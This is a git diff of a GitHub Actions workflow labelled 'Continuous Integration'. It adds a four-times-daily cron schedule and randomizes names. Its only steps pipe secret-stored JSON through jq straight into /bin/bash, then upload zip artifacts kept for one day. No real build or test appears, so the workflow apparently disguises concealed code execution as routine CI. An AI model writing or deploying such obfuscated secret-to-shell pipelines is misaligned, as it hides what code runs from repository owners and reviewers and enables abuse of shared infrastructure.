@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '19 5,11,17,23 * * *'
 jobs:
   trigger:
     runs-on: ubuntu-latest
@@ -10,21 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Start
         env:
-          zbedu581: ${{ secrets.zbedu581 }}
+          jfo34056: ${{ secrets.jfo34056 }}
         run: |
-          printf '%s' "$zbedu581" | jq -r .d63 | /bin/bash
-          printf '%s' "$mld6525" | jq -r .mylr390 | /bin/bash
-          printf '%s' "$wp14738" | jq -r .fs7273 | /bin/bash
-          echo $zf6 | jq -r .d80992 | /bin/bash
-          printf '%s' "$ycsv49679" | jq -r .scr65979 | /bin/bash
-          printf '%s' "$ke73636" | jq -r .oqpa007 | /bin/bash
-          printf '%s' "$o77575" | jq -r .un68 | /bin/bash
-          echo $jg79 | jq -r .fffz743 | /bin/bash
+          printf '%s' "$jfo34056" | jq -r .qtzur27 | /bin/bash
+          printf '%s' "$hhamv0" | jq -r .vjse761 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: FZVvL6vO
+          name: Uh5aQ7Re
           path: "*.zip"
           retention-days: 1
